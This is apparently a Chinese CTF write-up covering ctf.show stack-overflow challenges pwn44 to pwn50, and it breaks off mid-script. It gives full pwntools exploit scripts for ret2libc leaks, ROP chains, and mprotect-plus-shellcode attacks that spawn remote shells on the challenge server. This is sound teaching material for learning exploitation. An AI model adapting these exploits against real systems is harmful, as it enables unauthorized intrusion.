<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240702232450979.png" alt="image-20240702232450979"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28304&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn44&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0xa+0x8</span><br><span class="line">pop_ret_addr = 0x4007f3</span><br><span class="line">buf2_addr = 0x602080</span><br><span class="line">gets_addr = elf.symbols[&#x27;gets&#x27;]</span><br><span class="line">system_addr = elf.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(pop_ret_addr) + p64(buf2_addr) + p64(gets_addr) + p64(pop_ret_addr) + p64(buf2_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn45"><a href="#pwn45" class="headerlink" title="pwn45"></a>pwn45</h4><p>无system，无&#x2F;bin&#x2F;sh，有点熟悉，这不是在入门部分就折磨我的ret2libc吗？（生气</p>
<p>浅浅回忆一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解题思路：输出puts函数在内存中的位置，返回到main函数，根据puts函数的位置搜索libc库，从库中得到system的地址和/bin/sh字符串的地址，然后调用system函数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28280&quot;)</span><br><span class="line">elf = ELF(&quot;../pwm45&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x6b + 0x4</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p32(puts_plt_addr) + p32(main_addr) + p32(puts_got_addr)</span><br><span class="line"></span><br><span class="line">###############################################</span><br><span class="line"># 先接收一部分数据，再发送payload保证能得到正确的地址 #</span><br><span class="line">p.recv()									  #</span><br><span class="line">p.sendline(payload)							  #				</span><br><span class="line">puts_addr = u32(p.recv()[0:4])				  #	</span><br><span class="line">###############################################</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line">base_addr = puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="line">system_addr = base_addr + libc.dump(&quot;system&quot;)</span><br><span class="line">bin_sh_addr = base_addr + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p32(system_addr) + 0x4*b&#x27;a&#x27; + p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>上面的代码中用#号框起来的部分可以用p.sendline(payload) puts_addr &#x3D; u32(p.recvuntil(‘\xf7’)[-4:])来代替，这是因为libc库一般都是在内存的高位地址，以0xf7开头（这一点不知道为什么很多wp都没有说），使用gdb调试，r之后可以使用info proc mapping查看libc.so共享库的高位地址（从图中也可以看出来为什么要用0xf7）</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240703141006674.png" alt="image-20240703141006674"></p>
<p>也可以使用write函数来泄露地址（与puts函数不同的是write函数需要三个参数）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28280&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn45&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x6b + 0x4</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">write_plt_addr = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got_addr = elf.got[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(write_got_addr) + p32(4)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)	</span><br><span class="line">write_addr = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])			  </span><br><span class="line">print(hex(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;write&quot;,write_addr)</span><br><span class="line">base_addr = write_addr - libc.dump(&quot;write&quot;)</span><br><span class="line">system_addr = base_addr + libc.dump(&quot;system&quot;)</span><br><span class="line">bin_sh_addr = base_addr + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p32(system_addr) + 0x4*b&#x27;a&#x27; + p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn46"><a href="#pwn46" class="headerlink" title="pwn46"></a>pwn46</h4><p>跟上题类似的ret2libc，只是换成64位了而已。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">解题思路：依旧是先调用puts函数，返回到main函数，将puts函数在内存中的地址泄露出来。根据puts的地址搜索libc的版本，获得/bin/sh和system函数的地址</span><br><span class="line">payload1构造：offset*b&#x27;a&#x27; + pop_ret_addr + puts_got_addr + puts_plt_addr + main_addr</span><br><span class="line">payload2构造：offset*b&#x27;a&#x27; + pop_ret_addr + bin_sh_addr + system_addr</span><br><span class="line">至于payload2用不用加上ret_addr，我的理解是报错就加上，能过就不管</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240703145950310.png" alt="image-20240703145950310"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240703152954906.png" alt="image-20240703152954906"></p>
<p>使用vmmap查看libc库所在的地址，查找pop指令的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28211&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn46&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x70 + 0x8</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">pop_ret_addr = 0x400803</span><br><span class="line">ret_addr = 0x4004fe</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(pop_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 查找有7f这个字节的地址，然后向前读取6个字节，再补全0x00到8个字节</span><br><span class="line">puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line">base_addr = puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="line">system_addr = base_addr + libc.dump(&quot;system&quot;)</span><br><span class="line">bin_sh_addr = base_addr + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(pop_ret_addr) + p64(bin_sh_addr) + p64(ret_addr)  + p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#使用write泄露，这里需要注意的是write需要三个参数，分别需要pop到rdi，rsi，rdx中，这里可以发现没有pop rdx的指令，但是无伤大雅，因为第三个参数根本不重要，在本题中。</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28211&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn46&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x70 + 0x8</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">write_got_addr = elf.got[&#x27;write&#x27;]</span><br><span class="line">write_plt_addr = elf.plt[&#x27;write&#x27;]</span><br><span class="line">pop_ret_addr = 0x400803</span><br><span class="line">pop_pop_ret_addr = 0x400801</span><br><span class="line">ret_addr = 0x4004fe</span><br><span class="line"></span><br><span class="line"># 这里第二个pop rsi的指令其中包括了两个pop，所以多设置了一个p64(0)，其实是没什么用的，占个位置</span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(pop_ret_addr) + p64(1) + p64(pop_pop_ret_addr) + p64(write_got_addr) + p64(0) + p64(write_plt_addr) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 查找有7f这个字节的地址，然后向前读取6个字节，再补全0x00到8个字节</span><br><span class="line">write_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;write&quot;,write_addr)</span><br><span class="line">base_addr = write_addr - libc.dump(&quot;write&quot;)</span><br><span class="line">system_addr = base_addr + libc.dump(&quot;system&quot;)</span><br><span class="line">bin_sh_addr = base_addr + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">#这里又不需要ret指令了，怎么样，pwn很神奇吧（bushi</span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(pop_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(int fd,const void*buf,size_t count);</span><br><span class="line">参数说明：</span><br><span class="line">  fd:是文件描述符（write所对应的是写，即就是1）</span><br><span class="line">  buf:通常是一个字符串，需要写入的字符串</span><br><span class="line">  count：是每次写入的字节数</span><br><span class="line">  </span><br><span class="line">reference:</span><br><span class="line">https://blog.csdn.net/dangzhangjing97/article/details/79619894</span><br></pre></td></tr></table></figure>

<h4 id="pwn47"><a href="#pwn47" class="headerlink" title="pwn47"></a>pwn47</h4><p>ezret2libc，确实ez，这里直接上pwn45的脚本就好了，只需要修改端口，elf文件和offset即可</p>
<h4 id="pwn48"><a href="#pwn48" class="headerlink" title="pwn48"></a>pwn48</h4><p>没有write了，使用puts吧？可是我一直是用的puts啊，所以同pwn47即可</p>
<h4 id="pwn49"><a href="#pwn49" class="headerlink" title="pwn49"></a>pwn49</h4><p>提示是静态编译代码和mprotect函数，那么得先了解一下这两个概念</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虽然checksec检测出有canary，但是实际上只是因为它检测到了__stack__check__fail__local函数，本题并没有开启canary</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">静态编译：</span><br><span class="line">静态编译（Static Compilation）是一种编程技术，在生成可执行文件时将所有必要的库和依赖项直接包含在该可执行文件中。这样生成的可执行文件在运行时不依赖于外部的共享库或动态链接库（Dynamic Link Libraries，DLLs）。</span><br><span class="line"></span><br><span class="line">静态编译的特点</span><br><span class="line">独立性：</span><br><span class="line">静态编译生成的可执行文件独立于系统上安装的库，因为所有的库都已经被编译并链接到可执行文件中。</span><br><span class="line">这种独立性使得可执行文件在没有特定库或特定版本的库的系统上也能运行。</span><br><span class="line"></span><br><span class="line">文件大小：</span><br><span class="line">由于所有的依赖库都包含在可执行文件中，静态编译生成的可执行文件通常比动态编译生成的文件要大。</span><br><span class="line"></span><br><span class="line">性能：</span><br><span class="line">静态编译可能会提高程序的启动速度，因为它避免了在运行时解析和加载动态库的开销。</span><br><span class="line">但由于所有库都被包含进可执行文件中，内存使用量可能会增加。</span><br><span class="line"></span><br><span class="line">版本控制：</span><br><span class="line">静态编译确保了使用的库版本在编译时被固定下来，避免了由于库版本变化而导致的兼容性问题。</span><br><span class="line"></span><br><span class="line">安全性：</span><br><span class="line">静态编译可以减少由于动态库被替换或篡改而带来的安全风险。</span><br><span class="line">但是，如果库中有安全漏洞，更新这些库会变得更加困难，因为需要重新编译整个应用程序。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">静态编译与动态编译的比较</span><br><span class="line">静态编译：</span><br><span class="line">所有库和依赖项在编译时链接到可执行文件中。</span><br><span class="line">可执行文件在任何系统上运行都不需要额外的库。</span><br><span class="line">文件较大，内存占用可能较高。</span><br><span class="line">无需担心库版本变化引起的问题。</span><br><span class="line"></span><br><span class="line">动态编译：</span><br><span class="line">在编译时仅链接动态库的符号，实际库在运行时加载。</span><br><span class="line">可执行文件依赖于系统上安装的库。</span><br><span class="line">文件较小，内存占用较低。</span><br><span class="line">库版本变化可能导致兼容性问题，但更新库更容易。</span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line">静态编译是一种将所有依赖库和代码链接到单个可执行文件中的编译技术，使得生成的可执行文件在运行时不依赖于外部库。这种方法有其优点，如独立性和版本控制，但也有缺点，如文件较大和更新复杂。静态编译和动态编译各有优劣，选择哪种方式取决于具体的应用场景和需求。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mprotect函数</span><br><span class="line">mprotect 是一个系统调用，用于更改指定内存区域的保护属性（权限）。它通常用于控制内存访问权限，以增强安全性或实现特定功能。mprotect 函数在许多操作系统中都可用，包括Linux和Unix。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">addr：指向需要更改保护属性的内存区域的起始地址。该地址应与页面边界对齐。</span><br><span class="line">len：需要更改保护属性的内存区域的长度。长度会被向上取整到页面大小的倍数。</span><br><span class="line">prot：新的保护属性，可以是以下值的按位或（bitwise OR）组合：</span><br><span class="line">PROT_NONE：不允许任何访问。</span><br><span class="line">PROT_READ：允许读取。</span><br><span class="line">PROT_WRITE：允许写入。</span><br><span class="line">PROT_EXEC：允许执行。</span><br><span class="line"></span><br><span class="line">使用场景</span><br><span class="line">内存保护：</span><br><span class="line">通过将内存区域标记为只读，可以防止意外的写入操作，从而保护数据完整性。</span><br><span class="line"></span><br><span class="line">可执行内存：</span><br><span class="line">动态生成代码时，可以先分配内存并将其标记为可写，然后在代码生成完毕后将其标记为可执行。</span><br><span class="line"></span><br><span class="line">堆栈保护：</span><br><span class="line">在某些安全机制中，可以使用 mprotect 将堆栈的某些部分标记为不可执行，以防止利用堆栈溢出漏洞执行恶意代码。</span><br><span class="line"></span><br><span class="line">注意事项</span><br><span class="line">页面对齐：addr 参数需要是页面对齐的。如果不是页面对齐的地址，mprotect 调用将会失败。</span><br><span class="line"></span><br><span class="line">权限限制：减少内存区域的权限（如从读写改为只读）是安全的，但在增加权限（如从只读改为读写）时，需要特别小心，以防止潜在的安全漏洞。</span><br><span class="line"></span><br><span class="line">错误处理：调用 mprotect 后应检查返回值，并处理可能的错误，例如内存区域不属于进程、地址不对齐或无效的权限组合。</span><br></pre></td></tr></table></figure>

<p>了解到以上信息之后，解题思路如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先使用mprotect函数修改一片页表的权限，再调用read函数往这个页表写入shellcode，然后跳转到这个shellcode执行shell即可</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240703235439615.png" alt="image-20240703235439615"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240703235753094.png" alt="image-20240703235753094"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28263&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn49&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">mprotect_addr = elf.sym[&#x27;mprotect&#x27;]</span><br><span class="line">read_addr = elf.sym[&#x27;read&#x27;]</span><br><span class="line">print(hex(mprotect_addr),hex(read_addr))</span><br><span class="line">page_addr = 0x080da000 # 修改权限的页表地址</span><br><span class="line">size_addr = 0x1000 #一个页表的大小，4k，不过貌似会自动补全，所以写小点也没事</span><br><span class="line">perm_addr = 0x7 # rwx=7，懂得都懂</span><br><span class="line">pop_pop_pop_ret_addr = 0x08056194 # pop掉mprotect的三个参数，方便执行read函数</span><br><span class="line"></span><br><span class="line"># 执行mprotect函数</span><br><span class="line">payload = offset*b&#x27;a&#x27; + p32(mprotect_addr) + p32(pop_pop_pop_ret_addr) + p32(page_addr) + p32(size_addr) + p32(perm_addr)</span><br><span class="line"></span><br><span class="line"># 执行read函数并跳转到shellcode</span><br><span class="line">payload += p32(read_addr) + p32(page_addr) + p32(0x0) + p32(page_addr) + p32(size_addr)</span><br><span class="line"></span><br><span class="line"># 生成shellcode</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>后续试了一下覆盖0x08048000也可以，可能是没覆盖到重要代码，所以没崩掉吗，不太清楚，试了一下0x080db000也可以</p>
<h4 id="pwn50"><a href="#pwn50" class="headerlink" title="pwn50"></a>pwn50</h4><p>使用ret2libc的解法可以很轻松的解出来，不过我看官方的wp其实是想让你用mprotect解，所以这里也尝试一下用mprotect加上shellcode的方式解题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">解题思路：</span><br><span class="line">先调用mprotect，然后再调用gets，然后使用shellcode</span><br><span class="line">1.获取mprotect的地址，因为在elf中没有加载mprotect函数，mprotect实际上是在一个文件中，只在运行的时候才知道地址，所以这里首先要使用puts泄露获得libc库，然后再得到mprotect的地址（mprotect可以从readelf -s中知道有）</span><br><span class="line">2.调用gets函数写入shellcode，调用shellcode</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240704020942425.png" alt="image-20240704020942425"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240704022448317.png" alt="image-20240704022448317"></p>
<p>这个也是一个技巧，不止可以ROPgadget原来的pwn文件，也可以ROPgadget它的libc库，当然我这里只是截图演示一下，并没有下载正确的libc库，所以exp所用到的地址是从官方的wp里面抄的，libc库已经通过puts泄露出来了，所以如果去找来下载的话应该也是可以得到正确结果的</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240704022437603.png" alt="image-20240704022437603"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240704022704846.png" alt="image-20240704022704846"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240704022742533.png" alt="image-20240704022742533"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28275&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn50&quot;)</span><br><span class="line">offset = 0x20 + 0x8</span><br><span class="line"></span><br><span class="line"># puts泄露libc</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line">#ctfshow_addr = elf.sym[&#x27;ctfshow&#x27;]</span><br><span class="line">pop_rdi_ret_addr = 0x4007e3</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(pop_rdi_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)</span><br><span class="line">#p.recvuntil(&quot;Hello CTFshow&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#p.recvline() </span><br><span class="line">puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">#puts_addr = u64((p.recvline().split(b&quot;\x0a&quot;)[0]).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line"># 调用mprotect函数</span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line">base_addr = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">mprotect_addr = base_addr + libc.dump(&#x27;mprotect&#x27;)</span><br><span class="line">pop_rsi_ret_addr = base_addr + 0x0000000000023a6a</span><br><span class="line">pop_rdx_ret_addr = base_addr + 0x0000000000001b96</span><br><span class="line">page_addr = 0x601000</span><br><span class="line">size_addr = 0x1000</span><br><span class="line">perm_addr = 0x7</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(pop_rdi_ret_addr) + p64(page_addr) + p64(pop_rsi_ret_addr) + p64(size_addr) + p64(pop_rdx_ret_addr) + p64(perm_addr) + p64(mprotect_addr) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;Hello CTFshow&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"># gets写入shellcode</span><br><span class="line">gets_addr = elf.sym[&#x27;gets&#x27;]</span><br><span 